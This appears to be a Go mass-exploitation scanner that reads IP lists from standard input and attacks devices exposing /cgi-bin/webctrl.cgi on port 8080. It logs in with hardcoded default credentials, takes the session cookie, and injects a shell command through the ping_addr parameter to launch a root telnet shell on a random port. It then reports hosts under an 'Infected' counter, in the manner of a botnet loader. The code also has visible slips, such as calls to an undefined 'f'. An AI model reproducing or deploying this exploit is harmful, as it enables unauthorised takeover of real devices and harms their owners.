package main

import (
	"bufio"
    "fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var CONNECT_TIMEOUT time.Duration = 6
var READ_TIMEOUT time.Duration = 15
var WRITE_TIMEOUT time.Duration = 10
var syncWait sync.WaitGroup

var statusFound, statusFailed int

type scanner_info struct {
	username, password, ip, port, arch string
	bytebuf                            []byte
	err                                error
	resp, authed                       int
	conn                               net.Conn
}

func zeroByte(a []byte) {
	for i := range a {
		a[i] = 0
	}
}

func getStringInBetween(str string, start string, end string) (result string) {

	s := strings.Index(str, start)
	if s == -1 {
		return
	}

	s += len(start)
	e := strings.Index(str, end)

	if !strings.Contains(str, "sesskey") {
		return ""
	} else {
		return str[s:e]
	}
}

func setWriteTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
}

func setReadTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))
}

func readUntil(conn net.Conn, read bool, delims ...string) ([]byte, int, error) {

	var line []byte

	if len(delims) == 0 {
		return nil, 0, nil
	}

	p := make([]string, len(delims))
	for i, s := range delims {
		if len(s) == 0 {
			return nil, 0, nil
		}
		p[i] = s
	}

	x := bufio.NewReader(conn)
	for {
		b, err := x.ReadByte()
		if err != nil {
			return nil, 0, err
		}

		if read {
			line = append(line, b)
		}

		for i, s := range p {
			if s[0] == b {
				if len(s) == 1 {
					return line, len(line), nil
				}
				p[i] = s[1:]
			} else {
				p[i] = delims[i]
			}
		}
	}

	return nil, 0, nil
}

func (info *scanner_info) cleanupTarget(close int, conn net.Conn) {

	zeroByte(info.bytebuf)
	info.username = ""
	info.password = ""
	info.arch = ""
	info.ip = ""
	info.port = ""
	info.err = nil
	info.resp = 0
	info.authed = 0
}

func getCookie(conn net.Conn, ip string, port string) (int, string) {

	setWriteTimeout(conn, WRITE_TIMEOUT)
	conn.Write([]byte("POST /cgi-bin/webctrl.cgi HTTP/1.1\r\nHost: " + ip + ":" + port + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 115\r\nConnection: keep-alive\r\nReferer: http://125.62.218.180:8080/cgi-bin/webctrl.cgi?action=sysinfo_page\r\nCookie: sesskey=\r\nUpgrade-Insecure-Requests: 1\r\n\r\naction=login_authentication&redirect_action=sysinfo_page&login_username=blueangel&login_password=blueangel&B1=Login\n\n"))

	setReadTimeout(conn, 30)
	bytebuf := make([]byte, 256)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		return 0, ""
	}

	if !strings.Contains(string(bytebuf), "200") {
		return 0, ""
	}

	zeroByte(bytebuf)
	bytebuf = make([]byte, 256)
	l, err = conn.Read(bytebuf)
	if err != nil || l <= 0 {
		return 0, ""
	}

	deviceCookie := getStringInBetween(string(bytebuf), "Set-Cookie: ", "; path=/")
	if len(deviceCookie) < 5 {
		return 0, ""
	}

	if !strings.Contains(deviceCookie, "sesskey") {
		return 0, ""
	}

	conn.Close()
	return 1, deviceCookie
}

func processTarget(target string) {

	info := scanner_info{
		ip:       target,
		port:     "8080", //5555
		username: "",
		password: "",
		arch:     "",
		bytebuf:  nil,
		err:      nil,
		resp:     0,
		authed:   0,
	}

	info.conn, info.err = net.DialTimeout("tcp", info.ip+":"+info.port, CONNECT_TIMEOUT*time.Second)
	if info.err != nil {
		info.cleanupTarget(0, info.conn)
		syncWait.Done()
		return
	}

	ret, deviceCookie := getCookie(info.conn, info.ip, info.port)
	if ret == 0 {
		info.conn.Close()
		info.cleanupTarget(1, info.conn)
		syncWait.Done()
		return
	}

	info.conn, info.err = net.DialTimeout("tcp", info.ip+":"+info.port, CONNECT_TIMEOUT*time.Second)
	if info.err != nil {
		info.cleanupTarget(0, info.conn)
		syncWait.Done()
		return
	}

	setWriteTimeout(info.conn, WRITE_TIMEOUT)

	var rInt int = 0
	rInt = rand.Intn(9999-8080) + 8080
	info.conn.Write([]byte("GET /cgi-bin/webctrl.cgi?action=pingtest_update&ping_addr=127.0.0.1;busybox%20telnetd%20-l/bin/sh%20-p" + strconv.Itoa(rInt) + "; /sbin/telnetd%20-l/bin/sh%20-p" + strconv.Itoa(rInt) + "&B1=PING HTTP/1.1\r\nHost: " + info.ip + ":" + info.port + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nCookie: " + deviceCookie + "\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))

	setReadTimeout(info.conn, 30)
	info.bytebuf = make([]byte, 256)
	l, err := info.conn.Read(info.bytebuf)
	if err != nil || l <= 0 {
		info.conn.Close()
		info.cleanupTarget(1, info.conn)
		syncWait.Done()
		return
	}

	if strings.Contains(string(info.bytebuf), "200") {
		time.Sleep(6 * time.Second)
		f.Println(info.ip + ":" + strconv.Itoa(rInt) + " root:root")
		
		statusFound++
		info.conn.Close()
		info.cleanupTarget(1, info.conn)
		syncWait.Done()
		return
	}

	info.conn.Close()
	info.cleanupTarget(1, info.conn)
	syncWait.Done()
	return
}

func main() {

	var i int = 0
	go func() {
		for {
			f.Printf("%d's | Infected %d\n", i, statusFound)
			time.Sleep(1 * time.Second)
			i++
		}
	}()

	for {
		r := bufio.NewReader(os.Stdin)
		scan := bufio.NewScanner(r)
		for scan.Scan() {
			go processTarget(scan.Text())
			syncWait.Add(1)
		}
	}
}
